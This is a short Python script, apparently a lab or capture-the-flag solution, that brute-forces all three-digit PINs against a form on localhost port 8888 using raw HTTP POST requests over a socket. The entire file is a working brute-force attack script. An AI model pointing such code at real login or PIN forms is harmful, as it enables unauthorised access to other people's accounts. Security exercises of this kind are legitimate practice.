import socket

HOST = '127.0.0.1'
PORT = 8888  # might be diff on ur machine

# trying all 3digit pins
for i in range(1000):
    guess = str(i).zfill(3)  # ex: '007', '123'
    data = f"pin={guess}"

    # manual http post request (raw)
    req = (
        "POST / HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {len(data)}\r\n"
        "Connection: close\r\n"
        "\r\n"
        f"{data}"
    )

    try:
        sock = socket.socket()
        sock.connect((HOST, PORT))
        sock.send(req.encode())

        result = b""
        while True:
            chunk = sock.recv(1024)
            if not chunk:
                break
            result += chunk

        output = result.decode(errors="ignore")

        print(f"Trying [{guess}] --> {output.splitlines()[0]}")
        sock.close()

    except Exception as err:
        print(f"[!] Error on pin {guess}: {err}")
        continue
